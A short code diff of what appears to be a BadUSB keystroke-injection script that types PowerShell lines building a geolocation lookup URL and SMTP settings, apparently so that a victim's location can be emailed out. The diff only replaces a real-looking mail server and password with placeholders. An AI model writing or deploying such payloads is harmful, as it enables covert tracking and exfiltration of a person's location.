@@ -35,7 +35,7 @@ STRING $url = "https://www.latlong.net/c/?lat=$lat&long=$lon"
 DELAY 500
 ENTER
 DELAY 500
-STRING $smtpServer = "smtp.titan.email"
+STRING $smtpServer = "smtp.server.email"
 DELAY 500
 ENTER
 
@@ -50,7 +50,7 @@ DELAY 500
 ENTER
 
 DELAY 500
-STRING $smtpPassword = 'contraseña'
+STRING $smtpPassword = "password"
 DELAY 500
 ENTER
 
